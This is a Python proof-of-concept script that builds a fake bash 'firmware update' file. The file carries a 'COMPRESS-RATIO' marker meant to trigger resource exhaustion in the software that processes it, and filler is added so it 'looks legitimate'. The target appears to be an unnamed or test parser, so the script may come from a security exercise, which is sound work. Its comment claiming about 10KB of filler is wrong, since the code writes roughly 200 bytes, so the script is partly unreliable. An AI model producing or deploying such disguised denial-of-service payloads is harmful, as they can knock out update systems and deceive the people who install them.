# generate_malicious_firmware.py
import sys

def create_malicious_firmware(output_path, compression_ratio=1000):
    """
    Create a malicious firmware file that will trigger resource exhaustion
    
    Args:
        output_path: Path to save the malicious firmware file
        compression_ratio: Claimed compression ratio (higher = more resource intensive)
    """
    # Base content - this would be a small file that claims to expand to a much larger size
    header = f"#!/bin/bash\necho 'Firmware update script'\necho 'Version: 1.2.3'\n"
    
    # Add the special marker that triggers the vulnerability
    exploit = f"COMPRESS-RATIO:{compression_ratio}\n"
    
    # Add some filler content to make it look legitimate
    filler = "# " + "A" * 100 + "\n" * 100  # ~10KB of filler data
    
    # Add a harmless command at the end
    footer = "echo 'Firmware update complete'\nexit 0\n"
    
    # Combine all parts
    content = header + exploit + filler + footer
    
    # Write to file
    with open(output_path, 'w') as f:
        f.write(content)
    
    print(f"Malicious firmware created at {output_path}")
    print(f"File size: {len(content)} bytes")
    print(f"Claimed expansion size: {len(content) * compression_ratio} bytes")
    print(f"Compression ratio: {compression_ratio}:1")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python generate_malicious_firmware.py <output_path> [compression_ratio]")
        sys.exit(1)
    
    output_path = sys.argv[1]
    compression_ratio = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    
    create_malicious_firmware(output_path, compression_ratio)